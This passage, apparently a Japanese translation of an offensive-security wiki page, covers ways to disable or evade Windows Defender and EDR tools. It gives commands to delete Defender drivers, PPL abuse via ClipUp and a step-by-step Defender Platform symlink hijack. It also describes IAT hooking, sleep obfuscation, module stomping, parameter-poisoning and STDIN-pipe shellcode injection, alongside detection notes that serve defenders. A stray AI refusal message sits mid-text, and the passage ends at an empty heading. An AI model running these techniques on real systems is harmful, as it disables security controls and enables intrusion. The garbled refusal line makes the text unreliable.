# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` は使用できません。BTR はストレージスタックと `SystemRoot` リンクの準備が整う前に、`DriverEntry` からファイル I/O を実行するためです。`Start=1` と優先度の高い `Boot Bus Extender` グループを組み合わせると、Phase 1 で実行されます。この時点では NTFS は使用可能ですが、多くのシステム起動セキュリティドライバーとユーザーモード EDR サービスはまだ初期化されていません。`WdFilter` などの起動時フィルターはすでに読み込まれている場合がありますが、BTR は次回の起動前にそれらのバイナリやサービス構成を削除でき、SCM がサービス実行ファイルを起動する前に削除することもできます。BTR は起動時の評価後に実行され、有効な Microsoft 署名を持つため、ELAM ではこの隙間を塞げません。<sup>[[36]](#references)</sup>

複数のアクションが1つのトランザクション内で実行されます。PoC はハードコードされた `\SystemRoot\Temp\BootClean.log` に対する Action 1 を先頭に追加します。BTR はこのログを作成した後、自身の削除リクエストを処理し、アンロード前にログを削除します。これにより痕跡が減ります。また、フィードバックを `<random>.sys:<random>.dat` に保存すれば、ドライバーと両方のストリームをまとめて削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

### 検出精度の高い相関

署名だけに基づくルールや Microsoft の脆弱なドライバーのブロックリストでは、BTR の本来の機能の悪用に対処できません。正規の Defender 系統と任意のランチャーを区別しながら、以下の挙動を相関させることを推奨します。<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` の作成は、BTR のステージングで常に発生します。同じ `.sys` に付加された `.dat` ADS は特に疑わしいものです。正規の Defender は通常、フィードバックを `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` 以下に保存するためです。
- **System 7045 を伴わない Sysmon 12/13:** `Args=...:changelist` と `Group=Boot Bus Extender` を含む `HKLM\SYSTEM\CurrentControlSet\Services\<random>` の直接作成を、対応する SCM インストールイベントがないことと相関させます。
- **Sysmon 6 -> 23:** Defender 系統以外の既知の BTR ドライバーの読み込みと、その後に `System`/PID 4 によって実行されたファイル削除を相関させます。特にセキュリティ関連バイナリが対象の場合に注目します。
- **Sysmon 11 -> 23:** `System`/PID 4 による `\SystemRoot\Temp\BootClean.log` の短時間での作成と削除を検知します。
- `SeLoadDriverPrivilege` の割り当てと有効化を制限して監査します。`cmd.exe`、PowerShell、または不明なプロセスによってセキュリティツールのドライバーがステージングされる場合、Microsoft 署名だけでは信頼性の根拠として不十分です。

## LOLBIN を使った Protected Process Light (PPL) の悪用による AV/EDR の改ざん

Protected Process Light (PPL) は署名者とレベルの階層を適用し、同等以上に保護されたプロセスだけが互いに改ざんできるようにします。攻撃者の視点では、PPL 対応バイナリを正規の方法で起動し、その引数を制御できれば、ログ記録などの無害な機能を、AV/EDR が使用する保護ディレクトリに対する制約付きの PPL ベース書き込みプリミティブに変えることができます。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

プロセスが PPL として実行される条件
- 対象の EXE（および読み込まれるすべての DLL）は、PPL 対応 EKU で署名されている必要があります。
- `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` フラグを指定して、CreateProcess でプロセスを作成する必要があります。
- バイナリの署名者に適合する保護レベルを要求する必要があります（例: マルウェア対策の署名者には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows の署名者には `PROTECTION_LEVEL_WINDOWS`）。レベルが一致しない場合、作成に失敗します。

PP/PPL と LSASS の保護に関するより広範な概要も参照してください。

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

ランチャーツール
- オープンソースのヘルパー: CreateProcessAsPPL（保護レベルを選択し、引数を対象 EXE に渡します）:
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- 使用パターン:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

この内容は、PPL を悪用して AV のファイルを改変し、起動を妨げる具体的な手順を含むため、そのまま翻訳することはできません。防御目的の要約ならお手伝いできます。

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

注意事項と制約
- ClipUp が書き込む内容は配置場所以外制御できません。このプリミティブは、正確な内容の注入ではなく破損に適しています。
- サービスのインストール／起動と再起動のタイミングには、ローカル管理者/SYSTEM 権限が必要です。
- タイミングが重要です。対象が開かれていてはいけません。起動時に実行すれば、ファイルロックを回避できます。

検知
- 起動前後に、特に標準外のランチャーを親プロセスとして、異常な引数で起動される `ClipUp.exe` のプロセス作成。
- 不審なバイナリを自動起動するよう設定された新規サービスや、Defender/AV より常に先に起動するサービス。Defender の起動失敗の前に行われたサービスの作成／変更を調査してください。
- Defender のバイナリ／Platform ディレクトリのファイル整合性監視。保護プロセスフラグを持つプロセスによる予期しないファイルの作成／変更。
- ETW/EDR テレメトリ: `CREATE_PROTECTED_PROCESS` を指定して作成されたプロセスや、AV 以外のバイナリによる異常な PPL レベルの使用を確認してください。

緩和策
- WDAC/Code Integrity: PPL として実行できる署名済みバイナリと、その親プロセスを制限し、正当なコンテキスト以外での ClipUp の実行をブロックします。
- サービスの適切な管理: 自動起動サービスの作成／変更を制限し、起動順序の操作を監視します。
- Defender の改ざん防止と早期起動保護が有効になっていることを確認します。バイナリの破損を示す起動エラーを調査してください。
- 環境との互換性がある場合は、セキュリティツールを配置するボリュームでの 8.3 短い名前の生成を無効にすることを検討してください（十分にテストしてください）。

## Platform バージョンフォルダーのシンボリックリンクハイジャックによる Microsoft Defender の改ざん

Windows Defender は、次の配下にあるサブフォルダーを列挙して、実行元の Platform を選択します。
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

最も大きい辞書順のバージョン文字列（例: `4.18.25070.5-0`）を持つサブフォルダーを選び、そこから Defender サービスのプロセスを起動します（サービス／レジストリのパスもそれに応じて更新します）。この選択では、ディレクトリ再解析ポイント（シンボリックリンクを含む）を含むディレクトリエントリが信頼されます。管理者はこれを利用して Defender を攻撃者が書き込み可能なパスにリダイレクトし、DLL sideloading やサービス妨害を実現できます。<sup>[[21]](#references)[[22]](#references)</sup>

前提条件
- ローカル管理者（Platform フォルダー配下にディレクトリ／シンボリックリンクを作成するために必要）
- 再起動するか、Defender の Platform 再選択（起動時のサービス再起動）を実行できること
- 組み込みツールのみで実行可能（mklink）

有効な理由
- Defender は自身のフォルダーへの書き込みをブロックしますが、Platform の選択ではディレクトリエントリを信頼し、対象が保護された／信頼されたパスに解決されるか検証せず、辞書順で最も大きいバージョンを選択します。

手順（例）
1) 現在の Platform フォルダーの書き込み可能な複製を、例として `C:\TMP\AV` に用意します。
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、自分のフォルダーを指す、より高いバージョンのディレクトリ symlink を作成します:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクト先のパスから実行されていることを確認します:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
新しいプロセスパスが `C:\TMP\AV\` 配下にあり、サービス構成やレジストリにもその場所が反映されていることを確認してください。

Post-exploitation のオプション
- DLL sideloading/code execution: Defender がアプリケーションディレクトリから読み込む DLL を配置または置換し、Defender のプロセス内でコードを実行します。上記の [DLL Sideloading & Proxying](#dll-sideloading--proxying) のセクションを参照してください。
- Service kill/denial: バージョンシンボリックリンクを削除すると、次回起動時に設定済みのパスが解決されず、Defender の起動に失敗します。
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> この手法単独では権限昇格できない点に注意してください。管理者権限が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

レッドチームは、Import Address Table (IAT) をフックし、選択した API を攻撃者が制御する position-independent code (PIC) に経由させることで、ランタイム回避を C2 implant からターゲットモジュール自体に移せます。これにより、多くの kit が公開する限られた API（例: CreateProcessA）を超えて回避手法を一般化でき、同じ保護を BOF や post-exploitation DLL にも適用できます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

大まかな手順
- reflective loader を使って、ターゲットモジュールと一緒に PIC blob をステージングします（先頭に追加するか、コンパニオンとして配置）。PIC は自己完結型で、position-independent である必要があります。
- ホスト DLL の読み込み時に、その IMAGE_IMPORT_DESCRIPTOR をたどり、対象の import（例: CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）の IAT エントリを、薄い PIC wrapper を指すようにパッチします。
- 各 PIC wrapper は、実際の API アドレスへ tail-call する前に回避処理を実行します。一般的な回避処理には次のものがあります。
  - 呼び出しの前後でメモリを mask/unmask する（例: beacon 領域の暗号化、RWX→RX、ページ名や権限の変更後に復元）。
  - Call-stack spoofing: 偽装用のスタックを構築し、ターゲット API に移行することで、call-stack 解析時に想定されたフレームとして解決されるようにします。<sup>[[9]](#references)</sup>
- 互換性のため、Aggressor script（または同等のもの）が Beacon、BOF、post-ex DLL に対してフックする API を登録できるインターフェースを export します。

ここで IAT hooking を使う理由
- フックされた import を使用するあらゆるコードで機能し、ツールのコードを変更したり、Beacon に特定の API のプロキシを依存したりする必要がありません。
- post-ex DLL にも対応します。LoadLibrary* をフックすれば、モジュールの読み込み（例: System.Management.Automation.dll、clr.dll）を傍受し、それらの API 呼び出しにも同じメモリマスキングやスタック回避を適用できます。
- CreateProcessA/W を wrapper 経由にすることで、call-stack ベースの検出に対してプロセス生成を行う post-ex コマンドを安定して使用できます。

IAT hook の最小構成スケッチ（x64 C/C++ 疑似コード）
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
メモ
- relocations/ASLR の適用後、import が初めて使われる前に patch を適用します。TitanLdr/AceLdr のような Reflective loader は、ロードされた module の DllMain 内で hooking する例です。
- wrapper は小さく、PIC-safe に保ちます。patch 前に取得した元の IAT 値、または LdrGetProcedureAddress を使って本来の API を解決します。
- PIC では RW → RX の遷移を使い、書き込み可能かつ実行可能なページを残さないようにします。

Call-stack spoofing stub
- Draugr-style PIC stub は、無害な module 内の return address を使って偽の call chain を構築し、本物の API に処理を移します。
- これにより、Beacon/BOF から機密性の高い API への canonical な stack を想定する検知を回避できます。
- stack cutting/stack stitching 技法と組み合わせ、API prologue に到達する前に想定された frame 内に入ります。

運用への統合
- reflective loader を post-ex DLL の先頭に配置すると、DLL のロード時に PIC と hook が自動的に初期化されます。
- Aggressor script を使って対象 API を登録すると、コードを変更せずに Beacon と BOF が同じ evasion path の恩恵を受けられます。

検知/DFIR での考慮事項
- IAT の整合性: image 外（heap/anon）のアドレスに解決される entry、import pointer の定期的な検証。
- stack の異常: ロード済み image に属さない return address、non-image PIC への急な遷移、RtlUserThreadStart の祖先関係の不整合。
- loader telemetry: プロセス内での IAT 書き込み、import thunk を変更する DllMain の初期処理、ロード時に作成される予期しない RX region。
- image-load evasion: LoadLibrary* を hooking する場合は、memory masking event と相関する automation/clr assembly の不審なロードを監視します。

関連する構成要素と例
- ロード中に IAT patching を行う reflective loader（例: TitanLdr、AceLdr）
- memory masking hook（例: simplehook）と stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stub（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### 常駐 PICO による Import-time IAT hook

reflective loader を制御できる場合、hook を最初に確認するカスタム resolver で loader の `GetProcAddress` pointer を置き換え、`ProcessImports()` の**実行中**に import を hook できます:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- 一時的な loader PIC が自身を解放した後も存続する **resident PICO**（persistent PIC object）を構築します。
- loader の import resolver を上書きする `setup_hooks()` 関数をエクスポートします（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress` では ordinal imports をスキップし、`__resolve_hook(ror13hash(name))` のような hash-based hook lookup を使います。hook があればそれを返し、なければ本来の `GetProcAddress` に処理を委譲します。
- Crystal Palace の `addhook "MODULE$Func" "hook"` エントリで、リンク時に hook の対象を登録します。hook は resident PICO 内にあるため、有効な状態を保ちます。

これにより、ロード後に DLL の code section を patch せずに **import-time IAT redirection** を実現できます。

### 対象が PEB-walking を使う場合に hook 可能な import を強制する

import-time hooks が発動するのは、対象の IAT にその関数が実際に含まれている場合だけです。モジュールが PEB-walk + hash で API を解決し（import entry がない場合）、実際の import を強制することで、loader の `ProcessImports()` 経路にその関数を認識させます。

- hash による export 解決（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を、`&WaitForSingleObject` のような直接参照に置き換えます。
- コンパイラが IAT entry を生成するため、reflective loader が import を解決する際に interception が可能になります。

### `Sleep()` を patch しない Ekko-style の sleep/idle obfuscation

`Sleep` を patch する代わりに、implant が実際に使用する **wait/IPC primitives**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）を hook します。長時間の wait では、アイドル中にメモリ内の image を暗号化する Ekko-style obfuscation chain で呼び出しをラップします。<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer` を使用して、細工した `CONTEXT` フレームで `NtContinue` を呼び出す一連のコールバックをスケジュールします。
- 典型的なチェーン（x64）：イメージを `PAGE_READWRITE` に設定 → マップされたイメージ全体に対して `advapi32!SystemFunction032` で RC4 暗号化 → ブロッキング待機を実行 → RC4 復号 → PE セクションを走査して**セクションごとのアクセス許可を復元** → 完了を通知。
- `RtlCaptureContext` でテンプレートとなる `CONTEXT` を取得し、それを複数のフレームに複製して、各ステップを呼び出すためにレジスタ（`Rip/Rcx/Rdx/R8/R9`）を設定します。

運用上の詳細：長時間の待機では「成功」（例：`WAIT_OBJECT_0`）を返し、イメージをマスクしたまま呼び出し元が処理を続けられるようにします。このパターンは、アイドル時間中にモジュールをスキャナーから隠し、典型的な「パッチされた `Sleep()`」のシグネチャを回避します。

検出のアイデア（テレメトリベース）
- `NtContinue` を指す `CreateTimerQueueTimer` コールバックが短時間に集中して発生する。
- `advapi32!SystemFunction032` が、イメージサイズの大きな連続バッファに対して使用される。
- 範囲の広い `VirtualProtect` の後に、セクションごとのアクセス許可が独自に復元される。

### sleep-obfuscation gadget のランタイム CFG 登録

CFG が有効なターゲットでは、`jmp [rbx]` や `jmp rdi` のような関数途中の gadget への最初の間接ジャンプで、通常は `STATUS_STACK_BUFFER_OVERRUN` が発生してプロセスがクラッシュします。これは、その gadget がモジュールの CFG メタデータに登録されていないためです。強化されたプロセス内で Ekko/Kraken 系のチェーンを動作させ続けるには：<sup>[[30]](#references)</sup>

- チェーンで使用するすべての間接分岐先を、`NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` と `CFG_CALL_TARGET_VALID` エントリで登録します。
- ロード済みイメージ（`ntdll`、`kernel32`、`advapi32`）内のアドレスでは、`MEMORY_RANGE_ENTRY` の開始位置を**イメージベース**とし、**イメージ全体のサイズ**をカバーする必要があります。
- 手動マッピングされた領域、PIC 領域、stomp された領域では、代わりに**割り当てベース**と割り当てサイズを使用します。
- ディスパッチ gadget だけでなく、間接的に呼び出される export（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscall）や、間接分岐先となる攻撃者制御の実行可能セクションも登録します。

これにより、ROP/JOP スタイルの sleep chain は「CFG が有効でないプロセスでしか動作しない」ものから、`explorer.exe`、ブラウザー、`svchost.exe`、その他の `/guard:cf` でコンパイルされたエンドポイントでも再利用できるプリミティブになります。

### スリープ中のスレッド向け CET 対応スタック偽装

`CONTEXT` 全体の置き換えは目立ちやすく、偽装した `Rip` がハードウェアの Shadow Stack と一致していなければならないため、CET Shadow Stack 搭載システムでは問題を起こすことがあります。より安全な sleep-masking パターンは次のとおりです。<sup>[[30]](#references)</sup>

- 同じプロセス内の別のスレッドを選び、`NtQueryInformationThread` 経由でそのスレッドの `NT_TIB` / TEB のスタック境界（`StackBase`、`StackLimit`）を読み取る。
- 現在のスレッドの実際の TEB/TIB をバックアップする。
- `GetThreadContext` で実際のスリープ中のコンテキストを取得する。
- 実際の `Rip` だけをスプーフされたコンテキストにコピーし、スプーフされた `Rsp` / スタック状態はそのままにする。
- スリープ中、スプーフ用スレッドの `NT_TIB` を現在の TEB にコピーし、スタックウォーカーが正規のスタック範囲内でアンワインドするようにする。
- 待機が終わったら、元の TIB とスレッドコンテキストを復元する。

これにより、CET と整合する命令ポインターを保ちながら、TEB のスタックメタデータを信頼してアンワインドを検証する EDR スタックウォーカーを欺くことができます。

### APCベースの代替手法: Kraken Mask

タイマーキューのディスパッチがシグネチャで検出されやすい場合、同じスリープ・暗号化・スプーフ・復元のシーケンスを、キューイングされた APC を使って一時停止中のヘルパースレッドから実行できます。<sup>[[27]](#references)</sup>

- `NtTestAlert` を entrypoint とする helper thread を作成します。
- 準備した `CONTEXT` frames/APC を `NtQueueApcThread` でキューに登録し、`NtAlertResumeThread` で処理します。
- 既定の 64 KB の thread stack を使い切らないよう、chain state は helper stack ではなく heap に保存します。
- `NtSignalAndWaitForSingleObject` を使って start event をアトミックに通知し、待機状態に入ります。
- スキャナーが復元途中の stack を検出する可能性を抑えるため、TIB/context を復元する前に main thread を suspend します（`NtSuspendThread` → restore → `NtResumeThread`）。

これにより、同じ RC4 masking と stack-spoofing の目的を維持しながら、`CreateTimerQueueTimer` + `NtContinue` のシグネチャを helper-thread/APC のシグネチャに置き換えます。

追加の検出アイデア
- sleep、wait、APC dispatch の直前に呼び出される `NtSetInformationVirtualMemory` と `VmCfgCallTargetInformation`。
- `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject`、`ConnectNamedPipe` の前後で呼び出される `GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread` の後に、現在の thread の TEB/TIB の stack bounds に直接書き込む処理。
- `SystemFunction032`、`VirtualProtect`、または section permission の復元ヘルパーに間接的につながる `NtQueueApcThread`/`NtAlertResumeThread` の chain。
- 署名済みモジュール内の dispatch pivot として、`FF 23`（`jmp [rbx]`）や `FF E7`（`jmp rdi`）などの短い gadget signature を繰り返し使用すること。


## 高精度 Module Stomping

Module stomping は、明らかに検出されやすい private executable memory を割り当てたり、新たに使い捨ての DLL を読み込んだりする代わりに、**ターゲットプロセス内にすでにマップされている DLL の `.text` section から payload を実行します**。上書き先には、**ロード済みの disk-backed image** を選びます。プロセスが引き続き必要とする code path を壊すことなく、payload を収容できるコード領域が必要です。<sup>[[1]](#references)[[2]](#references)</sup>

### 信頼性の高いターゲット選択

`uxtheme.dll` や `comctl32.dll` などの一般的なモジュールを対象にした安易な stomping は不安定です。DLL がリモートプロセスにロードされていない場合があり、コード領域が小さすぎるとプロセスがクラッシュします。より信頼性の高いワークフローは次のとおりです。

1. ターゲットプロセスのモジュールを列挙し、すでにロードされている DLL の**名前のみの include list**を作成します。
2. まず payload を作成し、**正確なバイトサイズ**を記録します。
3. ディスク上の候補 DLL をスキャンし、PE セクションの**`.text` の `Misc_VirtualSize`**と payload のサイズを比較します。ファイルサイズよりこちらが重要です。メモリにマップされた**ときの**実行可能セクションのサイズを反映するためです。
4. **Export Address Table (EAT)**を解析し、stomp の開始オフセットとしてエクスポートされた関数の RVA を選びます。
5. **影響範囲**を計算します。payload が選択した関数の境界を超えると、メモリ上でその後に配置された隣接エクスポートを上書きします。

実際の環境でよく使われている recon／選択用ヘルパー:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

運用上の注意点
- `LoadLibrary` / 予期しないイメージのロードに伴うテレメトリを避けるため、リモートプロセスですでに**ロード済み**のDLLを優先する。
- 対象アプリケーションで実行される頻度が低いエクスポートを優先する。そうしないと、スレッド作成の前後に通常のコードパスが改変されたバイト列に到達する可能性がある。
- 大きなimplantでは、インジェクターのソースコード内でバッファ全体を正しく表現するため、shellcodeの埋め込みを文字列リテラルから**バイト配列／波括弧付き初期化子**に変更する必要がある。

検出のアイデア
- 一般的なprivate RWX/RXアロケーションではなく、**イメージに裏付けられた実行可能ページ**（`MEM_IMAGE`、`PAGE_EXECUTE*`）へのリモート書き込み。
- メモリ上のエクスポートエントリポイントのバイト列が、ディスク上のバックアップファイルと一致しなくなっている。
- 最近先頭バイトが変更された正規DLLエクスポート内から実行を開始するリモートスレッドやコンテキストピボット。
- DLLの`.text`ページに対する不審な`VirtualProtect(Ex)` / `WriteProcessMemory`の呼び出しに続くスレッド作成。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3)は、従来のリモート書き込み経路（`VirtualAllocEx` + `WriteProcessMemory`）を回避する**プロセスインジェクション／EDR回避**手法です。すでに実行中のターゲットにバイト列をコピーする代わりに、Windowsが選択された`CreateProcessW`の起動パラメーターを子プロセスに**コピー**し、それらを`PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内に格納する仕組みを悪用します。<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW`によってコピーされる、poison可能なキャリア

有用なキャリアは次のとおりです。

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（`CREATE_UNICODE_ENVIRONMENT`指定時）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

実際に使用する際のキャリアの制約：

- `lpCommandLine`は`CreateProcessW`に対して**書き込み可能なメモリ**を指す必要があり、ヌル終端文字を含めて最大**32,767 Unicode文字**に制限される。
- `lpEnvironment`は、連続する`NAME=VALUE\0`文字列を追加の`\0`で終端したUnicode環境ブロックである必要がある。
- `lpReserved`は公式には予約済みであるため、`ShellInfo`へのマッピングは、安定した文書化済みの仕様ではなく実装詳細として扱うべきである。

これにより、通常のプロセス作成が**ペイロード転送プリミティブ**になる。オペレーターは攻撃者が制御する起動データを指定して子プロセスを作成し、Windowsにプロセス間コピーを実行させる。

### リモート書き込みAPIを使わないリモート検索フロー

子プロセスの作成後、**読み取り専用**のプリミティブを使ってコピーされたバッファを解決する。

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress`を取得
2. リモートの`PEB`を読み取る
3. `PEB.ProcessParameters`をたどる
4. `RTL_USER_PROCESS_PARAMETERS`を読み取る
5. 選択したポインターを使用する：
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

最小限のフロー：

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### コピーされたパラメータバッファの実行

コピーされたパラメータ領域は通常 `RW` であり、実行可能ではありません。一般的な P3 チェーンは次のとおりです。

1. プロセスを通常どおり作成する（サスペンド状態にしない）
2. `NtProtectVirtualMemory` / `VirtualProtectEx` を使って、選択したパラメータページを実行可能にする
3. `PROCESS_INFORMATION` ですでに返されているメインスレッドのハンドルを再利用する
4. `NtSetContextThread`（`CONTEXT_CONTROL`、`RIP` を上書き）で実行先を変更する

従来のスレッドハイジャックのワークフローとは異なり、`SuspendThread` / `ResumeThread` は**不要**です。返されたメインスレッドのハンドルに対して、直接コンテキストを変更できます。

これにより、インジェクションで一般に監視されている次のような API を回避できます。

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 多くの場合、`SuspendThread` / `ResumeThread` も回避できます

### Null バイトの制限と段階的な shellcode

3 種類のキャリアはすべて**文字列または文字列のようなデータ**であるため、`0x00` を含む生のペイロードは転送中に切り詰められます。実用的な回避策は、実行時に定数を再構築し、任意の第 2 ステージを読み込む、**null-free の第 1 ステージ**を使うことです。

単純な方法として、XOR による定数合成があります。

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Thisにより、first stageは転送されるパラメーターにnull byteを埋め込まずに、stack文字列、API引数、DLLパス、またはsecond-stage shellcode loaderを構築できます。

### first stageからのstackベースのAPI呼び出し

first stageで`LoadLibraryA`などのAPIを呼び出す必要がある場合、次のようにできます。

- 対象プロセスのstackに文字列／bufferをpushする
- **32-byte x64 shadow space**を確保する
- `RCX`、`RDX`、`R8`、`R9`に定数または`RSP`相対ポインターを設定する
- 呼び出し前に`RSP`を**16-byte境界に整列**させる

その後、second stageをstackから`PAGE_READWRITE`のallocationにコピーし、`VirtualProtect`で`PAGE_EXECUTE_READ`に変更してからjumpできます。これにより、直接RWX allocationする必要がありません。

### 検出の手がかり

著者が挙げる、有効な調査の機会：

- `VirtualProtectEx` / `NtProtectVirtualMemory`によって**process-parameterページが実行可能**になる
- その保護属性の変更後に`SetThreadContext` / `NtSetContextThread`が実行される
- `PEB`、続いて`RTL_USER_PROCESS_PARAMETERS`をリモートから読み取る
- プロセス作成時の`lpCommandLine`、`lpEnvironment`、または`STARTUPINFO.lpReserved`の値が異常に長い、あるいはエントロピーが高い

### 注意事項

- P3は**プロセス間転送の手法**であり、それだけで実行を実現するものではありません。コピーしたパラメーターには、実行権限への変更と実行先のリダイレクトが引き続き必要です。
- `RtlCreateProcessReflection` / Dirty Vanityは著者らも検討しましたが、内部で`NtWriteVirtualMemory`や`NtCreateThreadEx`などの不審なprimitiveを呼び出すため、採用されませんでした。

## Console STDIN pipe injection

対話型のconsole子プロセスも、**payload転送のprimitive**として利用できます。injectorは子プロセスのstandard inputをpipeにリダイレクトし、markerに続けてshellcodeを送信します。consoleプログラムがデータを自身のprivate memoryに読み込んだ後、injectorはそのbufferを見つけて実行可能にし、子プロセスのthreadの実行先をそこへリダイレクトします。この方法は`VirtualAllocEx`と`WriteProcessMemory`を回避しますが、一般的なEDR bypassではなく、依然としてprocess injectionです。<sup>[[41]](#references)</sup>

「named-pipe」という説明とは異なり、参考実装では`CreatePipe`を呼び出しており、作成されるのは**anonymous pipe**です。Windowsは内部でanonymous pipeを一意の名前を持つpipe objectとして実装していますが、このPoCは`\\.\pipe\<name>`パスを選択せず、`CreateNamedPipe`も呼び出しません。デフォルトのsecurity descriptorを使って継承可能なhandleを作成し、読み取りhandleを`STARTUPINFO.hStdInput`に設定し、`STARTF_USESTDHANDLES`を指定して、handle継承を有効にした状態で新しい子プロセスを起動します。したがって、このPoCは指定されたconsole executableを起動するものであり、既存のプロセスにpipeを接続するものではありません。<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### 参考ワークフロー

実装では、次の手順を使用します。<sup>[[41]](#references)</sup>

1. 子プロセスの`STDIN`と`STDOUT`用にanonymous pipeのペアを作成します。親側の2つのhandleでは継承を無効にし、プロセス作成後に親プロセス内の子側handleの複製を閉じます。
2. `CREATE_NEW_CONSOLE`を指定して、`netsh.exe`や`nslookup.exe`などの対話型executableを起動します。子プロセスはリダイレクトされたstandard handleを継承します。
3. 親側の`STDIN` handleを通じて、完全なbinary `rawData` arrayを`WriteFile`で送信します。consoleプログラムはbyte列を読み込み、そのコピーを自身のprivateなcommit済みregionのいずれかに残します。
4. `VirtualQueryEx`で子プロセスのaddress spaceを走査し、`ReadProcessMemory`で候補の`MEM_PRIVATE` regionを読み取り、`rawData`の先頭にあるmarkerを検索します。
5. `VirtualProtectEx`で検出したbufferを`PAGE_EXECUTE_READWRITE`に変更します。
6. main threadを特定してsuspendし、`NtSetContextThread`で`RIP`を`found_address + 0x19`に設定してからresumeします。

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

提供された実装はx64専用です。`CONTEXT.Rip`を変更し、埋め込みペイロードにはx64 shellcodeを使用します。`rawData`は25バイトのマーカーで始まるため、実行可能なバイト列は16進オフセット`0x19`から始まります。ペイロードを置き換える場合は、この配置を維持するか、マーカー、検索ベクター、配列サイズ、実行オフセットをまとめて更新してください。ソースコメントには、bad characterとして`0x0A`、`0x0D`、`0x1A`も記載されています。このワークフローでは、子プロセスのtokenや権限は変更されません。<sup>[[41]](#references)</sup>

小規模なネイティブヘルパーやペイロードのコンパイルパターンについては、[Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md)を参照してください。

## ファイルレス回避と認証情報窃取のためのSantaStealerの手法

